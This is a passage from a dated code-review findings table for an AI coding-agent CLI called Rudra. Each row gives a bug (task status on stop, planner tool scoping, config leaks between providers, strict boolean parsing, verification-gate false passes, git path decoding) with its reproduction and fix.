| CR-C1 | **CRITICAL** | **`DONE`** | **`STOP_RUN` leaves the task `IN_PROGRESS`, so `--continue` can never retry it — A1.93 all over again, on the other exit path.** Every attempt sets `task.status = IN_PROGRESS` (`loop/engine.py:230`) and both `STOP_RUN` exits return without resetting it (`:245` coder-could-not-run, `:277` gate escalate); `_stop` then persists the ledger in that state. Only the *cancel* path resets it (`:679-681`) — with a comment naming exactly this hazard: "PENDING because `Ledger.resumable()` excludes IN_PROGRESS on purpose (ledger.py:91-100) -- leaving it there is A1.93, where `--continue` silently skips the one task the user actually interrupted." **Reproduced** against the real `run_task` with an escalating report: `OUTCOME stop_run STATUS in_progress`, `ON DISK in_progress resumable: ()`. So a 5-task `--auto` run whose provider hiccups on task 3 leaves t3 permanently unreachable — `--continue` runs t4 and t5 and never retries it. If t3 was the last task, `check_resumable` (`main_agent.py:114-117`) refuses the resume with a false statement: *"nothing pending — 0 of 1 task(s) finished."* Reachable via a gate `escalate` too, i.e. `--auto` without `--allow-shell` denying the test stage. Secondary: `summarise` (`:584-585`) then labels that task `_NOT_ATTEMPTED` — "never attempted — the run stopped" — for the one task that *was* attempted. `tests/test_loop_run.py:85` maps `Outcome.STOP_RUN → TaskStatus.PENDING` in its **fake** `run_task`, so the tests assume the behaviour the code does not implement. <br><br>**FIXED 2026-08-21.** Fixed: `_stop` returns an `IN_PROGRESS` task to `PENDING` on `Outcome.STOP_RUN` (`loop/engine.py`), so the stop path and the cancel path agree. Verified against the real `run_task`: outcome `stop_run`, status `PENDING`, and `Ledger.load(...).resumable()` returns the task. Regression: `tests/test_loop_engine.py::test_an_escalating_gate_stops_the_whole_run` (strengthened) + `::test_a_stopped_run_leaves_its_task_resumable`. |
| CR-C2 | **Important** | **`DONE`** | **The planner holds `write_file`, `edit_file`, `delete` and `execute`, so `plan()`'s "touches nothing" invariant does not hold under `--auto`.** `agent/planner_agent.py:216` builds `FilesystemMiddleware(backend=backend, **evict)` with **no `tools=` argument**. **Measured against the installed deepagents:** default → `['delete','edit_file','execute','glob','grep','ls','read_file','write_file']`; with `tools=["ls","read_file"]` → exactly those two. The backend here is the full `CompositeBackend(default=LocalShellBackend)` (`main_agent.py:566,706`), so `execute` is functional, not the inert stub. Under `--auto`, `rules.py:310` returns `allow` by mode default, so **all three planner stages can write into the user's project before `_settle_plan` runs** — contradicting `engine.plan()`'s docstring ("Touches nothing in the project… which is what lets RudraAgent put an approval gate between this and work()") and `_tools_for_stage`'s stated principle ("Absence is the enforcement"). The subagents scope their list precisely (`subagents/build.py:182`, `tools=list(spec.fs_tools)`); the planner does not. `_stream_planner_turn` even carries a guard branch for `write_file` tool calls (`planner_agent.py:509-510`), which corroborates that this is unintended. `--plan` is safe (`rules.py:311-312` denies) and `ask` prompts; the exposure is `--auto`. <br><br>**FIXED 2026-08-21.** Fixed: the planner's `FilesystemMiddleware` is scoped to `PLANNER_FS_TOOLS = [ls, read_file, glob, grep]`. Verified against the installed deepagents: the planner's tool list is exactly those four — no `write_file`, `edit_file`, `delete` or `execute`. |
| CR-C3 | **Important** | **`DONE`** | **Every subagent's memory recall searches for its own name, never for the task.** `subagents/build.py:134` `query = getattr(context, "task", "") or spec.name`. **`SubagentContext` has no `task` field** — enumerated at runtime: `['project_path','backend','gate','console','cfg','checkpointer','session_id','facts','skills_sources','usage','mcp','memory','trace']` (`subagents/runner.py:63`), and no assignment to `context.task` exists anywhere in `src/`. So the query is always the literal `"coder"` / `"tester"` / `"general-purpose"`. The coder's recall block — justified in the surrounding comment as "a memory recorded during task 1 reaches task 2's coder" — is the 8 palace entries nearest the *word* "coder", identical for every task in every run, and `usage.record_recall` (`:143`) bills it as recall spend. `run_subagent` receives the real task text as `prompt`; the context never carries it. <br><br>**FIXED 2026-08-21.** Fixed: `run_subagent` passes the invocation prompt through `build_agent` to `_prompt_for`, which uses it as the recall query. Regression: `tests/test_memory_wiring.py::test_the_recall_query_is_the_task_not_the_subagent_name`. |
| CR-C4 | **Important** | **`DONE`** | **The gate's blocker text is computed, then thrown away before the planner is consulted on a block.** `engine.py:288` computes `blocker_text = _blocker_text(report)`, but it is only ever fed back to the *coder* (`_coder_prompt`, `:165`). Both `BLOCKED` exits overwrite `task.note` with a content-free string: `"no progress: the same failure twice"` (`:291`) and `f"{task.attempts} attempts exhausted"` (`:299`). `work()` then calls `planner(..., reason="blocked", task=task)` and `consult_planner` interpolates that note verbatim (`planner_agent.py:606-610`), so the planner is asked to re-plan around a failure it is told nothing about: *"Task t1 (write the parser) failed and was given up on:\n\n3 attempts exhausted\n\nAdd a task taking a DIFFERENT approach."* `record_block_memory` (`:449`) files the same empty reason into the palace, defeating its own docstring ("Bug-to-fix pairs are what make this worth storing"). `tests/test_planner_consult.py:61` hand-sets a realistic note and asserts "the blocker goes back verbatim" — the engine never produces such a note, so the test covers only the prompt template. <br><br>**FIXED 2026-08-21.** Fixed: both `BLOCKED` paths now append `blocker_text` to `task.note`, so `consult_planner` and `record_block_memory` receive the actual failure instead of "3 attempts exhausted". |
| CR-C5 | **Important** | **`DONE`** | **`verify_project` blocks the event loop, so neither Ctrl-C press does anything during verification.** `_verify` (`engine.py:193-201`, called at `:258` and `:273`) is a plain synchronous function that reaches `subprocess.Popen` in `shell/runner.py:120` with `test_timeout` (default 600 s), called from `async def run_task`. `_cancel_on_sigint` (`cli.py:294-340`) installs the handler via `loop.add_signal_handler`, whose callback runs only when the loop regains control. So during a 10-minute `pytest` the first Ctrl-C does nothing **and** the second press's `os._exit(EXIT_CANCELLED)` — the escape hatch whose docstring says "A cancel that itself hangs must not need a kill from another terminal" — is equally deferred. Deferral confirmed directly with a pty harness: `HANDLER FIRED -> cancel` printed only after the blocking call returned. Fix: `await asyncio.to_thread(verify_project, ...)`. (`MemoryStore.write`/`search` at `:428` and `build.py:135` are the same shape — ONNX embedding on the loop thread — but far shorter.) <br><br>**FIXED 2026-08-21.** Fixed: `_verify` is `async` and runs `verify_project` via `asyncio.to_thread`, so the event loop can service the SIGINT callback while a subprocess runs. Both call sites await it. |
| CR-C6 | Minor | **`DONE`** | **`ask_approval`'s "Ctrl-C is cancel" branch is unreachable under the shipping CLI.** `loop/plan_view.py:100` catches `(EOFError, KeyboardInterrupt)`, and its docstring calls the EOF/Ctrl-C asymmetry "the one safety property this function has." But `Prompt.ask` blocks on `input()` inside the asyncio task while `_cancel_on_sigint` has replaced the default SIGINT handler, so SIGINT no longer raises `KeyboardInterrupt`. **pty repro of the exact configuration:** Ctrl-C at 1.5 s was swallowed, the typed answer was consumed (`GOT LINE: 'hello'`), and the handler fired only after `input()` returned. So at the `[a]pprove [r]evise [c]ancel` prompt Ctrl-C prints nothing and the prompt keeps waiting. The safety property survives by accident — the deferred `task.cancel()` lands at the first `await` in `work()` — but the prompt is unresponsive and the second-press force-exit is deferred too. <br><br>**2026-08-21.** **Partly fixed by CR-C5.** With verification off the loop, the cancel callback now fires during a run rather than after it. The prompt itself still blocks the loop inside `input()`; moving `ask_approval` to a thread is a separate change to the approval path and is left for a deliberate pass. <br><br>**Closed 2026-08-21 as OPEN-2.** That deliberate pass happened: the prompt now runs on a daemon thread and Ctrl-C prints while it is open. See the OPEN-2 row for the three ways the prescribed one-line fix turned out to be wrong. |
| CR-C7 | Minor | **`DONE`** | **`work()`'s blocked→consult→new-task cycle has no bound.** `engine.py:692-695`: on `Outcome.BLOCKED` it sets `consulted_on_empty = False` and consults the planner again. `consulted_on_empty` is the only loop bound and every block resets it; `max_fix_attempts` bounds one task, nothing bounds the number of tasks. A planner that answers each "Add a task taking a DIFFERENT approach" with `add_tasks` produces a task that blocks, which consults it again, indefinitely — `max_fix_attempts` coder invocations plus a planner call per cycle, with Ctrl-C as the user's only exit. `grep` finds no `max_tasks` or iteration cap anywhere in `src/rudra/`. <br><br>**FIXED 2026-08-21.** Fixed: `MAX_BLOCKED_CONSULTS = 5` bounds the blocked→consult→new-task cycle, and the run stops with a message naming how many tasks blocked (`loop/engine.py`). |
| CR-C8 | Minor | **`DONE`** | **Each planner stage runs the same palace search twice; the "already cached" justification is false.** `planner_agent.py:409-414` calls `memory.search(task, limit=8)` after `build_planner_prompt` already did so at `:152`, with a comment claiming "the search is already cached by the store's open collection". `MemoryStore.search` (`memory/store.py:175-222`) caches nothing — `_open()` caches the *collection handle*; every call re-runs `search_memories`, i.e. a fresh ChromaDB/ONNX MiniLM embedding plus a `collection.get`. `create_main_agent` builds all three stages up front (`main_agent.py:698-719`), so a run pays 6 embeddings instead of 3, synchronously, during construction. <br><br>**FIXED 2026-08-21.** Fixed: `build_planner_prompt` takes `usage` and records the recall spend where the search already happened; the caller's second `memory.search` is gone. Verified: one search per stage, was two — so a run pays 3 embeddings, not 6. |
| CR-C9 | Minor | **`DONE`** | **`create_main_agent` leaks the aiosqlite connection when construction fails after it opens.** `main_agent.py:597` opens `db_conn` with no `try/except` around `:597-758`. `RudraAgent.close()` is the only thing that closes `db_conn`, `mcp_client` and `transcript`, and it is unreachable if the factory raises — and anything after `:597` can: `checkpointer.setup()`, `TranscriptWriter(...)` (`:641`), or `create_planner_agent` → `build_model("planner")`, which raises on any configuration error. In the REPL `create_main_agent` runs once per input (`cli.py:1455`) and the surrounding `except` clauses catch only `CancelledError`/`KeyboardInterrupt`/`EOFError`, so a misconfigured run leaks a connection, its aiosqlite thread, and an open transcript handle **per attempt**. <br><br>**FIXED 2026-08-21.** Fixed: everything after `aiosqlite.connect` runs inside `try/except BaseException`, which closes the connection and re-raises (`agent/main_agent.py`). Verified by forcing `AsyncSqliteSaver` to raise: the error propagates and the connection's thread is stopped rather than leaked. |

### CR-D — config · llm · state · compat · stacks

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-D1 | **CRITICAL** | **`DONE`** | **Ollama's default `base_url` leaks into every hosted provider — the documented Anthropic/OpenAI config talks to `localhost:11434`.** `config/schema.py:226` hard-codes `"base_url": "http://localhost:11434"` in `DEFAULTS["model"]["default"]`. `deep_merge` merges per *leaf*, so a user table setting only `provider`/`model`/`api_key_env` never clears it, and TOML has no null, so there is **no way to unset it** — only to overwrite it with the right URL. **Reproduced with the exact config `Documentation/03-providers.md:228-233` publishes** (which states at `:240` "No `base_url` needed"): `PROVIDERS["anthropic"].build_kwargs(...)` → `{'base_url': 'http://localhost:11434', 'temperature': 0.3, 'max_tokens': 131072, 'timeout': 300}`, with `provenance['model.default.base_url'] == 'builtin'`. Every request from every role goes to the local Ollama port; the user sees a connection error — or, worse, an Ollama answer — with no indication why. **This defeats product goal #1 (provider-agnostic).** Role inheritance widens it: `[model.coder] provider = "anthropic"` under an Ollama `[model.default]` inherits the local URL too (`loader.py:376`). No test asserts the current behaviour; `tests/test_llm_providers.py:114-130` asserts the opposite intent for `None`. <br><br>**FIXED 2026-08-21.** Fixed: `base_url` and `max_output_tokens` moved out of `DEFAULTS` into `PROVIDERS["ollama"]` as `default_base_url` / `default_max_output_tokens`, applied by `build_kwargs` only when the role declares none. Added `effective_base_url()` for anything that reports or groups by endpoint (`llm/probe.py` now uses it). Verified: the documented Anthropic config emits `{'temperature': 0.3, 'timeout': 300}` — no `base_url`, no `max_tokens` — while Ollama still emits `base_url=http://localhost:11434, num_predict=131072`. Regression: `tests/test_llm_providers.py::test_a_hosted_provider_never_inherits_the_ollama_endpoint`. |
| CR-D2 | **Important** | **`DONE`** | **`max_output_tokens = 131072` default is sent as `max_tokens` to hosted providers that reject it.** `config/schema.py:230` — an Ollama-shaped `num_predict` value that `providers.py:66-67` forwards as `max_tokens` for `anthropic`/`openai`/`openai_compatible`. Same leak path and same reproduction as CR-D1: the documented Anthropic config emits `max_tokens: 131072`, which exceeds every current Anthropic and OpenAI model's output cap, so the provider rejects the request with a 400 on the **first call of every run**. The docs set this key for NVIDIA (`Documentation/03-providers.md:207`, `16384`) but say nothing in the Anthropic/OpenAI sections, so the shipped default stands. <br><br>**FIXED 2026-08-21.** Fixed with CR-D1 — same root cause, same commit. |
| CR-D3 | **Important** | **`DONE`** | **`[agent]` booleans are never type-checked — `verbose = "false"` resolves to `True`.** `config/loader.py:151-154` checks key *names* only, then `:426`/`:429` coerce blind with `bool(...)`. `max_fix_attempts` and `max_questions` **are** validated (`:156-175`), and every other section rejects a wrong type (`[compat]` `:218-219`, `[tools]` `:224-233`, `[mcp]` `:238-250`) — the two booleans are the gap. **Measured:** `verbose = "false"` / `stream_tokens = "no"` → `AgentConfig(verbose=True, stream_tokens=True)`. Non-empty strings are truthy, so the quoted form of "off" means "on", silently enabling untruncated-payload tracing and token streaming. This is exactly the class of typo the "unknown keys are fatal" design exists to catch. <br><br>**FIXED 2026-08-21.** Fixed: `validate()` type-checks `verbose` and `stream_tokens`. Verified: `verbose = "false"` now raises `ConfigError` instead of resolving to `True`. Regression: `tests/test_config.py::test_an_agent_boolean_must_actually_be_a_boolean`. |
| CR-D4 | **Important** | **`DONE`** | **`_as_bool` fails *open* on any unrecognised value — including the `shell_in_auto` security gate.** `config/layers.py:75-76` `return raw.strip().lower() not in {"false","0","no","off",""}`: anything outside that five-item set is `True`. It backs `RUDRA_SHELL`, `RUDRA_SHELL_IN_AUTO`, `RUDRA_AUTO_BRANCH` and `RUDRA_VERBOSE` (`layers.py:164-178`). **Measured:** `RUDRA_SHELL_IN_AUTO=flase` (a plausible typo) → `tools.shell_in_auto = True, provenance='env'`. That is the single opt-in letting an unattended `--auto` run execute arbitrary shell (A1.49), and the failure direction is **permissive**. Inconsistent with both neighbours: the TOML spelling of the same typo is a hard error (`loader.py:224-226`) and `RUDRA_PERMISSIONS_MODE` is validated against `VALID_MODES` (`loader.py:183-189`). <br><br>**FIXED 2026-08-21.** Fixed: `_as_bool` is total and strict, takes the variable name, and raises naming it. Verified: `RUDRA_SHELL_IN_AUTO=flase` → `ConfigError: RUDRA_SHELL_IN_AUTO: expected true or false, got 'flase'`, while every accepted spelling still resolves correctly. Regression: `tests/test_config.py::test_an_unrecognised_boolean_env_var_is_refused_not_read_as_true`. |
| CR-D5 | **Important** | **`DONE`** | **A non-table top-level key crashes with a raw traceback instead of a `ConfigError`.** `loader.py:401` `declared = {*BUILTIN_ROLES, *user.get("model", {}), *project.get("model", {})}` and `:152` `for key in agent:` both assume the section is a table; `validate()` checks the section *name* against `_TOP_LEVEL` (`:118-119`) but never its type. **Reproduced live:** a config containing the single line `model = 5` raises `TypeError: 'int' object is not iterable` at `loader.py:401` *before* `validate()` runs (`agent = 5` does the same at `:152`), and `cli.py:378-385` catches only `ConfigError`, so `rudra config list` prints a full Rich traceback — contradicting `_load_config_or_exit`'s stated contract at `cli.py:372-373`: "A malformed config file is a user error, not a crash — never show a traceback for one." <br><br>**FIXED 2026-08-21.** Fixed in both places: `validate()` type-checks each section, and the pre-`validate` `declared` computation guards `[model]` in each TOML layer and names which file is wrong. Verified: `model = 5` and `agent = 5` both raise `ConfigError`, not `TypeError`. Regression: `tests/test_config.py::test_a_scalar_where_a_table_belongs_is_a_config_error_not_a_traceback`. |
| CR-D6 | **Important** | **`DONE`** | **A Django (or `unittest`) project with a virtualenv gets `python -m pytest`.** `stacks/detect.py:147-149` returns `[venv_python, "-m", "pytest"]` as soon as a venv interpreter is found; the `manage.py` check (`:152-153`) and `_declares_pytest` (`:154-155`) sit **below** it and are consulted only when the project has no virtualenv. **Measured** on a project with `manage.py`, `Django>=5` in `requirements.txt`, and `.venv/bin/python` but no `.venv/bin/pytest`: `resolve_test_command(...)` → `['<proj>/.venv/bin/python','-m','pytest']` → `No module named pytest` on every run; `manage.py test` is never reached. Same for a stdlib-`unittest` project with a venv. Since `verify_project`'s test stage **blocks**, the fix loop sees a permanent non-test failure it cannot repair. `tests/test_stacks.py:261` pins the venv fallback only for a project with neither marker, so this input is uncovered, not intended. <br><br>**FIXED 2026-08-21.** Fixed: interpreter selection is split from runner selection, so the venv interpreter is used with the `manage.py` → `_declares_pytest` → `unittest discover` cascade (`stacks/detect.py`). Verified: a Django project with a venv and no pytest now gets `[<venv>/bin/python, manage.py, test]`; every other path is unchanged. Regression: `tests/test_stacks.py::test_a_django_project_with_a_venv_gets_manage_py_not_pytest`. |
| CR-D7 | Minor | **`DONE`** | **`config list` / `config get` omit `[skills]`, `[mcp]` and `[memory]` — A1.54 recurring one level up.** `cli.py:408` hand-writes `for section in ("agent","permissions","tools","compat")`, while `Config` (`loader.py:339-349`) also carries `skills`, `mcp` and `memory`. The docstring at `cli.py:390-398` argues the enumeration was made "structural" so no key could be accepted, honoured and never printed — but only the *field* loop is derived; the *section* tuple has not grown since Step 7. **Measured:** `rudra config list` prints zero rows matching `mcp.|skills.|memory.`, and `rudra config get mcp.timeout` answers `Unknown key`. Since there is no `config set` (S6.1), `config list` is the only way to see which layer set a value — so `[mcp] deny`, `mcp_in_auto` and the enabled skill set, all policy-bearing, are invisible. <br><br>**FIXED 2026-08-21.** Fixed: `_config_sections()` derives the list from `fields(Config)`. Verified: `rudra config list` now prints `skills.*`, `mcp.*` and `memory.*` rows, and `rudra config get mcp.mcp_in_auto` answers instead of `Unknown key`. |
| CR-D8 | Minor | **`DONE`** | **The path normalizer patches two of three `validate_path` import sites, and its docstring asserts there are only two.** `compat/deepagents_path.py:20-24` states `validate_path` "is only called inside `deepagents.middleware.filesystem` (confirmed by grep across the full deepagents package)". False for the pinned 0.7.4: `deepagents/middleware/_fs_interrupt.py:18` imports it and calls it at `:86` and `:116`. The guard pins only two modules (`:92-93`) and `:237-238` patch only those two, so `_fs_interrupt` keeps the unpatched original. Inert today — that module is reached only when `permissions=` is passed, which Rudra deliberately never does (U.7/A1.46) — but the docstring is what a future maintainer will trust when U.7 reopens, and no test pins the call-site count. <br><br>**FIXED 2026-08-21.** Fixed: the docstring names all three call sites, `_fs_interrupt.validate_path` is patched too, and `require_deepagents_attr` guards it so an upstream move is caught. `CLAUDE.md:385` corrected to match. |
| CR-D9 | Minor | **`DONE`** | **`api_key_env` is echoed verbatim by `config list` / `config get`, undoing A1.81's masking.** `cli.py:405-406` iterates `fields(model)` and prints each value unmasked (`:452-456`, `:474`); `api_key_env` is one of them (`schema.py:67`). `llm/errors.py:33-44` establishes that a user pasting the key itself into `api_key_env` is a real, observed mistake and masks it in `MissingApiKeyError` — but the same value goes straight to the terminal here, from the command the troubleshooting docs point at and whose output people paste into bug reports. Fix: reuse `_looks_like_a_secret` in `_flatten`/`config_get`. <br><br>**FIXED 2026-08-21.** Fixed: `_safe_value` masks an `api_key_env` whose value `_looks_like_a_secret`. Verified: a pasted `sk-ant-…` prints `<redacted — this looks like a key, not a variable name>` in both `config list` and `config get`, while `ANTHROPIC_API_KEY` prints unchanged. |

### CR-E — verify · testing · git · filesystem · middleware

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-E1 | **CRITICAL** | **`DONE`** | **The gate passes a Python file that does not parse, whenever no stack marker file exists yet.** `verify/pipeline.py:101-102` dispatches the syntax stage on the *detected stack*, not the file's suffix: `if stack != "python": return _node_syntax_stage(...)`. `detect()` returns `[]` unless `pyproject.toml`/`setup.py`/`requirements.txt` is on disk (`stacks/registry.py:11-13`), so on a greenfield tree `stack is None` and a `.py` file is routed to the **JavaScript** checker, which finds no `.js` and returns `NOT_APPLICABLE`. That outcome is not in `_HALTING` (`result.py:25`), so the pipeline continues; lint, typecheck and test are all `NOT_APPLICABLE`; only stubs runs, and `_scan_python` swallows `SyntaxError` **on purpose** ("The syntax stage blocks before this one ever runs", `stubs.py:94-97`). **Reproduced end-to-end through `verify_project`** on a temp project whose `app.py` is `def main(:\n    retur`: <br>`passed: True  escalate: False` <br>`syntax not_applicable "no JavaScript files changed"` · `lint/typecheck not_applicable "no stack detected"` · `test not_applicable` · `stubs passed "1 changed file(s) scanned"` <br>`loop/engine.py:279-281` then marks the task `DONE` on `report.passed`. This is the greenfield flow `CLAUDE.md` §8 advertises (`rudra "build a flask app"`), and it is exactly the A1.8 failure the package's own docstring says it replaces. The stage detail is wrong too — "no JavaScript files changed" about a `.py` file. <br><br>**FIXED 2026-08-21.** Fixed: the syntax stage is now **suffix-driven, not stack-driven** (`verify/pipeline.py`). Every changed `.py`/`.pyi` is `ast.parse`d regardless of whether a stack was detected; a non-Python stack with Python files in the diff runs both checks and merges the findings. Verified end-to-end through `verify_project` on a greenfield tree: `app.py` = `def main(:` → `passed=False, syntax=failed`; a valid file still passes. Regression: `tests/test_verify_pipeline.py::test_a_python_file_is_parsed_even_before_the_project_has_a_marker_file` + `::test_a_valid_python_file_still_passes_with_no_stack`. |
| CR-E2 | **Important** | **`DONE`** | **A deleted file makes the syntax stage report "does not parse".** `verify/pipeline.py:109-114` catches `OSError` from `path.read_text(...)` and appends it as a `Finding`, so a missing file becomes a blocking failure. `verify/stubs.py:47-51` does the opposite for the same input and `tests/test_verify_stubs.py:106` pins that — the two native stages disagree about deletions. Deletions genuinely reach here: `changed_since` includes them by design (`engine.py:92-93`, `:254`) and `changed_files_from_git` returns ` D path` entries. **Reproduced:** `syntax_stage(d, PYTHON, ['deleted.py'], ...)` → `failed`, with `message="[Errno 2] No such file or directory: '/var/.../deleted.py'"`. Non-escalating, so the fix loop is handed a nonexistent-file error verbatim, produces the same signature twice, and the task goes `BLOCKED` — and an absolute host path leaks into the model prompt. <br><br>**FIXED 2026-08-21.** Fixed: `_parse_python_files` skips a path that is not a file, matching `stubs._read`. Verified: `syntax_stage(..., ['gone.py'])` → `PASSED`, no findings. Regression: `tests/test_verify_pipeline.py::test_a_deleted_file_is_skipped_not_failed`. |
| CR-E3 | **Important** | **`DONE`** | **git porcelain C-quoting is not decoded — any non-ASCII filename is mangled.** `git/core.py:86-92` takes `path = line[3:]` and only `.strip('"')`; `git status --porcelain` C-quotes such paths (`?? "caf\303\251.py"` for `café.py`). **Reproduced** against real `git status` bytes: `_parse_status` yields the literal `caf\303\251.py`, which does not exist on disk. Two live consequences: (1) `rudra verify` in a repo containing `café.py` feeds the mangled name to the syntax stage → `FileNotFoundError` → CR-E2's false blocking failure; (2) in the loop, `git_snapshot` digests an absent path so before and after are both `""`, a real edit is invisible, and `engine.py:252-255` records "the coder wrote nothing" and burns every attempt — the A1.66 class, on any project with a non-ASCII filename. `filesystem/tree.py:135-156` already uses `-z` and gets this right. <br><br>**FIXED 2026-08-21.** Fixed: `_unquote` decodes git's C-quoting (octal escapes are UTF-8 bytes, so latin-1 → unicode_escape → latin-1 → utf-8). Verified against **real** `git status --porcelain` output in a scratch repo: `"caf\303\251.py"` parses to `café.py`, which exists on disk. Regression: `tests/test_git_core.py::test_status_decodes_a_c_quoted_non_ascii_path`. |
| CR-E4 | **Important** | **`DONE`** | **`rudra verify` crashes or silently eats text when tool output contains brackets.** `verify/report.py:133` and `:135` print `finding.message` and `stage.output_tail` straight from mypy/ruff/eslint/pytest through Rich with markup enabled, unescaped; `stage.detail` at `:120`/`:125` has the same exposure (for `MISSING_TOOL`, detail *is* `result.stderr`, `pipeline.py:347`). **Measured:** a mypy message containing `list[int]` renders as `incompatible type "list"` — the reader loses the part that matters; an `output_tail` containing `[/dim]` raises `rich.errors.MarkupError` out of `render()` **after** the table printed, so the user gets no failure output at all. mypy emits `list[int]`/`dict[str, Any]` constantly, and this repo's own suite puts `[/dim]` in pytest output. This is the A1.67/A1.48/A1.91 class that `trace/render.py` already escapes for. <br><br>**FIXED 2026-08-21.** Fixed: `finding.message`, `stage.output_tail` and `stage.detail` are all `escape()`d (`verify/report.py`). Verified: a mypy message keeps `list[int]` and `dict[str, Any]`, and an `output_tail` containing `[/dim]` renders instead of raising `MarkupError`. Regression: `tests/test_verify_report.py::test_tool_output_with_brackets_is_neither_swallowed_nor_fatal`. |
| CR-E5 | **Important** | **`DONE`** | **A suite that collected zero tests but exited 0 is reported as PASSED.** `testing/runner.py:84-86`: `return exit_code != 0 and total == 0` — the "collected nothing" signal requires a **non-zero** exit, but `cargo test` on a crate with no tests exits **0** while printing `test result: ok. 0 passed; 0 failed`. **Measured:** `parse_counts('rust', <real cargo no-test output>, '')` → `Counts(total=0, ...)`; `_collected_nothing('rust', 0, 0)` → `False` → `test_stage` returns `PASSED, detail="0 run"` and `verdict_line` prints "passed — all 5 stages ran clean" for a run that exercised nothing. Worse, `tests_produced_no_judgement` (`loop/bounds.py:60-61`) fires only on `NOT_APPLICABLE`, so the **tester subagent is never dispatched** and the task is marked `DONE` with no test ever written — contradicting the principle `tests/test_testing_runner.py:167` states: "nothing ran, so nothing is verified either". <br><br>**FIXED 2026-08-21.** Fixed: a parsed total of zero means "collected nothing" whatever the exit code; `total is None` keeps the exit-code signal (`testing/runner.py`). Verified: `cargo test` with 0 tests exiting 0 is now detected, while 3 passing tests and unparsed output behave as before. |
| CR-E6 | **Important** | **`DONE`** | **`node --check` timing out or failing to launch counts as "parsed".** `verify/pipeline.py:438-440` guards `if result.exit_code not in (0, None)`, but `exit_code is None` means the command produced **no verdict** — timed out, or the binary could not start (`shell/runner.py:130`, `:143`). Excluding `None` treats "never ran" as "parsed clean", and with no findings the stage returns `PASSED, detail=f"{len(javascript)} file(s) parsed"` (`:451-457`). The command-stage path deliberately does the opposite (`:339-349`: `exit_code is None` → `MISSING_TOOL, escalate=True`). A JS project where `node --check` is killed at `test_timeout` gets a green syntax stage over a file nobody checked, and the loop marks the task `DONE`. <br><br>**FIXED 2026-08-21.** Fixed: `exit_code is None` in the node syntax stage returns `MISSING_TOOL` with `escalate=True`, mirroring the command-stage path, instead of counting as parsed. |
| CR-E7 | **Important** | **`DONE`** | **One non-UTF-8 byte in tool output raises out of the subprocess call.** `shell/runner.py:120-128` builds the child with `text=True` and no `encoding`/`errors`, so `communicate()` decodes strict UTF-8. **Reproduced:** `UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0`, raised from `subprocess._translate_newlines` straight out of `run_gated`. Neither `run_tests` (`testing/runner.py:135`) nor `git/core.py:113` catches it. A test suite or linter printing a latin-1 byte — or a commit subject with one via `log()`/`--format=%s` — takes the path down: inside `run_pipeline` the blanket `except Exception` (`pipeline.py:222-233`) converts it into an *internal Rudra error* with `escalate=True`, stopping the whole run and blaming Rudra for the user's byte; outside it (`changed_files_from_git`, `git_snapshot`) it is an uncaught traceback. Fix: `encoding="utf-8", errors="replace"`. <br><br>**FIXED 2026-08-21.** Fixed: `run_gated` passes `encoding="utf-8", errors="replace"`. Verified: a process writing `b"\xff\xfe ok"` returns exit 0 with replacement characters instead of raising `UnicodeDecodeError` out of `communicate()`. |
| CR-E8 | Minor | **`DONE`** | **`source_files` hides any directory named `build`/`out`/`dist`/`target`/`coverage` at any depth.** `verify/stubs.py:168` matches `_SKIP_DIRS` against every part of the relative path, while `filesystem/tree.py:41-46` root-anchors exactly these five names with the reason spelled out (A1.29: "they silently hide real source from the agent"). **Measured** on one tree: `project_tree` lists `src/app.py`, `src/build/pipeline.py`, `src/out/handler.py`; `source_files` returns only `('src/app.py',)`. So the model is shown files the gate will never scan, and `changed_since` — which falls back to `source_files` when `before is None` (`engine.py:288`) — drops them from `files_touched` on the first task of a non-git project. <br><br>**FIXED 2026-08-21.** Fixed: `source_files` uses tree.py's split — the five ambiguous names root-anchored, the rest at any depth. Verified: `src/build/pipeline.py` and `src/out/handler.py` are now scanned, while root `build/` and `node_modules/` are still skipped. |
| CR-E9 | Minor | **`DONE`** | **The verdict claims "all 5 stages ran clean" when advisory lint failed.** `verify/report.py:74` returns that string whenever `skipped == 0`, and `_INCONCLUSIVE` (`:31`) covers only `NOT_APPLICABLE`/`COVERED_BY` — so a lint stage with `outcome=FAILED, blocking=False` counts as clean. **Reproduced:** lint FAILED with detail "12 problems" → `verdict_line` → "passed — all 5 stages ran clean", exit 0. The module docstring's own rule ("a gate reporting success while stages were skipped is A1.57 at report level") is violated by the sentence itself, and this verdict is what `_write_log` puts at the top of `verify.log`. <br><br>**FIXED 2026-08-21.** Fixed: `verdict_line` counts non-blocking FAILED stages. Verified: advisory lint failing now reads `passed — lint (12 problems) failed (advisory)`, and a genuinely clean run still reads `passed — all 5 stages ran clean`. |
| CR-E10 | Minor | **`DONE`** | **pytest `xfailed`/`xpassed` are matched but dropped from the total.** `testing/parse.py:61-65` builds `total = passed + failed + skipped`; `_PYTEST_PAIR` (`:19`) captures `xfailed\|xpassed` but neither is ever added. **Measured** on a real run — "1 failed, 1 passed, 1 skipped, 1 xfailed, 1 error" (5 tests) → `Counts(total=4, failed=2, skipped=1)`. Cosmetic in the detail line today, but `total` is also the input to `_collected_nothing`, so it should be right. <br><br>**FIXED 2026-08-21.** Fixed: `xpassed` adds to passed, `xfailed` to skipped (`testing/parse.py`). Verified on real pytest output: "1 failed, 1 passed, 1 skipped, 1 xfailed, 1 error" now totals **5**, was 4. |
| CR-E11 | Minor | **`DONE`** | **Fence stripping mangles a markdown file that legitimately opens and closes with a fence, and raises on non-str content.** `middleware/fix_write_params.py:22` `_FENCE_RE = r"^```[^\n]*\n?(.*?)```\s*$"` with `re.DOTALL`, applied **always on** (D4). (a) Writing a README whose content is ` ```bash\nnpm i\n``` \n\nSome text\n\n ```js\nconst a = 1;\n``` ` silently deletes the first opening fence and the last closing fence, corrupting the file. (`tests/test_fix_write_params.py:36` deliberately asserts the greedy behaviour for the ```markdown-wrapped case; the two shapes are distinguishable by the info string and by whether the interior holds an unmatched fence.) (b) `content.strip()` at `:34-36` assumes a string — a model emitting `"content": ["a","b"]` raises `AttributeError` inside `wrap_tool_call` instead of the tool returning a correctable validation error. The sandbox branch three lines below **does** guard with `isinstance(args[key], str)`. <br><br>**2026-08-21.** **Half fixed.** The crash is fixed: `content` is only fence-stripped when it `isinstance(str)`, so a model emitting a list gets a correctable tool error instead of `AttributeError` inside `wrap_tool_call`. The greedy-fence half is **WONTFIX for now**: `tests/test_fix_write_params.py:38` asserts that behaviour deliberately for the ```markdown-wrapped case, and the two shapes are 